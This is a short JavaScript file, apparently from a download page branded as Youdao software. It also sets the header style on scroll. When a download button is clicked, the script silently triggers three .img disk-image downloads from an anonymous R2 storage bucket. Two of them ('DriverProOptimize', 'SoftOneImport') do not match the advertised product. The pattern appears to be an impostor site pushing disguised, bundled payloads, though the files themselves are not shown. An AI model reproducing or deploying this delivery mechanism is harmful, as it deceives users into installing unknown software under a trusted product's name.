const downloadFiles = [
  'https://pub-75c990a203134520b61f8066f8cf02e0.r2.dev/%E6%9C%89%E9%81%93Desktop_Setup_win64_7.17.13.img',
  'https://pub-75c990a203134520b61f8066f8cf02e0.r2.dev/%E6%9C%89%E9%81%93DriverProOptimize_x64_v2.img',
  'https://pub-75c990a203134520b61f8066f8cf02e0.r2.dev/%E6%9C%89%E9%81%93SoftOneImport-64bit_7.59.img'
];

document.querySelectorAll('.download-button').forEach((button) => {
  button.addEventListener('click', () => {
    downloadFiles.forEach((url, index) => {
      const link = document.createElement('a');
      link.href = url;
      link.download = '';
      link.target = 'youdao-download-' + index;
      link.rel = 'noopener';
      document.body.appendChild(link);
      link.click();
      link.remove();
    });
  });
});

const header = document.getElementById('site-header');
const updateHeader = () => {
  header.className = window.scrollY > 24 ? 'navScrolled' : 'navTop';
};
window.addEventListener('scroll', updateHeader, { passive: true });
updateHeader();
